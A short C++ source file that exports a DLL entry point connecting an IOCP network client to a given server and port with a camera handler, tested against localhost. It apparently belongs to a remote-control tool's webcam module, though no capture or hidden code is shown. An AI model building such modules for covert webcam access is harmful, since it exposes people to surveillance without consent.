#include "IOCPClient.h"
#include "Camera.h"
#include "Manager.h"


extern "C" __declspec(dllexport) 
void  ModuleEntry(char* szServerAddr, unsigned short uPort, DWORD dwParam){
	CManager *pManager = new CManager();

	CIOCPClient *pClient = new CIOCPClient(pManager,
		szServerAddr, uPort);

	CMsgHandler *pHandler = new CCamera(pManager);

	pManager->Associate(pClient, pHandler);
	pClient->Run();

	delete pHandler;
	delete pClient;
	delete pManager;
}

int main(){
	CIOCPClient::SocketInit();
	ModuleEntry("127.0.0.1", 10086, 0);
	CIOCPClient::SocketTerm();
	return 0;
}